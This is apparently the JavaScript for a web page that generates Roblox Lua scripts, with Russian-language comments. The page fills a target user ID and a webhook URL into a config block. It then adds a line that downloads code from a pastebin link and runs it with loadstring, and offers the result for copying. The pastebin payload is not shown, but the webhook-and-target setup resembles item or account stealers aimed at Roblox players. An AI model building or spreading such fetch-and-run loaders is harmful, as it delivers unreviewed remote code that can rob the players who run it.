document.getElementById('generateBtn').addEventListener('click', function() {
    let userId = document.getElementById('userId').value || "8986116710";
    let webhookUrl = document.getElementById('webhookUrl').value;
    let scriptType = document.getElementById('scriptType').value;
    let customScript = document.getElementById('customScript').value;
    
    if (!webhookUrl) {
        alert('Введите Webhook URL');
        return;
    }
    
    let loadScript = scriptType === "22s" 
        ? 'loadstring(game:HttpGet("https://pastebin.com/raw/vyRfjXm0"))()'
        : customScript;
    
    let script = `-- ========== КОНФИГ ==========
local CONFIG = {
    TARGET_USER_ID = "${userId}",
    WEBHOOK_URL = "${webhookUrl}",
}
-- ========== КОНЕЦ КОНФИГА ==========

${loadScript}

print("Скрипт загружен")`;
    
    document.getElementById('scriptOutput').textContent = script;
    document.getElementById('output').style.display = 'block';
    document.getElementById('copyBtn').style.display = 'inline-block';
});

document.getElementById('copyBtn').addEventListener('click', function() {
    let script = document.getElementById('scriptOutput').textContent;
    navigator.clipboard.writeText(script);
    alert('Скопировано!');
});

document.getElementById('scriptType').addEventListener('change', function() {
    let customTextarea = document.getElementById('customScript');
    if (this.value === 'custom') {
        customTextarea.style.display = 'block';
    } else {
        customTextarea.style.display = 'none';
    }
});
